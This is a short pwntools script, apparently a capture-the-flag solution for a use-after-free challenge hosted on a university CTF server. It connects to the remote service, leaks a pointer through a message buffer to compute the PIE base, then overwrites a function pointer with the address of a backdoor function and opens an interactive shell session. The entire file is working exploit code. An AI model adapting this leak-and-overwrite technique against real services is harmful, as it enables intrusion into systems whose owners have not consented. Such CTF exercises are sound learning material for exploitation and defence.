from pwn import *

context.arch = 'amd64'
#re = process('./UAF/uaf')

re = remote( 'edu-ctf.csie.org', 10177 )

re.sendafter('Size of your messege: ' ,  str( 0x10 ))
re.sendafter('Messege: ' ,  b'a' * 8)
re.recvuntil( b'a' * 8 )
pie = u64( re.recv(6) + b'\0\0' ) - 0xa77 #bye_func 0ffset
success( 'PIE - > %s'  %hex(pie))

re.sendlineafter( 'Size of your messege:' , str( 0x10 ) )
re.sendlineafter( 'Messege:' , b'a' * 8 + p64(pie + 0xab5)) #back_door
re.interactive()